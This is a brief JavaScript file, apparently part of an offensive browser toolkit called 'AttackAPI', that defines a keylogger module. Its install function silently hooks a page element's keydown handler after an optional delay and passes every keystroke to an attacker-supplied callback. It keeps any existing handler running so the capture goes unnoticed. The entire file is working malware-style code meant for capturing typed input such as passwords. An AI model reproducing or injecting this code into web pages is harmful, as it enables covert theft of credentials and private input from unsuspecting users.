AttackAPI.KeyLogger = {};
AttackAPI.KeyLogger.install = function (callback, target, delay) {
	var target = (target == undefined)?window:target;
	var delay = (delay == undefined)?0:delay;
	
	setTimeout(function () {
		var onkeydown = target.onkeydown;
		target.onkeydown = function (e) {
			var e = (e == undefined)?window.event:e;
			
			callback(e.keyCode?e.keyCode:e.which, e);
			
			if (onkeydown)
				return onkeydown(e);
				
			return true;
		};
	}, delay);
};
